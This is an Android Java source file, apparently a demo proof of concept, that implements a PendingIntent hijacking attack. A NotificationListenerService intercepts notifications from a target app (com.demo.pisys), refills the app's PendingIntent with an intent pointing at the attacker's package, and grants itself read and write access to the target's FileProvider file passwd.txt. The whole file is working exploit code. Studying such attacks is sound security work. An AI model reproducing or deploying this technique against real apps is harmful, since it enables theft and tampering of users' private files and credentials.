package com.demo.piattack;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NotifyService extends NotificationListenerService {
    private static String TAG = "NotifyService";

    /**
     * 发布通知
     * @param sbn 状态栏通知
     */
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.i(TAG,"当有新通知时会回调！");
        //只监听特定应用的通知
        if("com.demo.pisys".equals(sbn.getPackageName())){
            Log.i(TAG,"监听到目标APP有新的通知!");
            PendingIntent pi = sbn.getNotification().contentIntent;
            Intent attackIntent = new Intent();
            attackIntent.setPackage("com.demo.piattack");
            attackIntent.setDataAndType((Uri.parse("content://com.demo.pisys.fileprovider/files/passwd.txt")),"*/*");
            // 添加FileProvider的读写flag
            attackIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            try {
                pi.send(this,0,attackIntent,null,null);
            } catch (PendingIntent.CanceledException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 通知已删除
     * @param sbn 状态栏通知
     */
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.i(TAG,"当有通知被移除时会回调！");
    }
}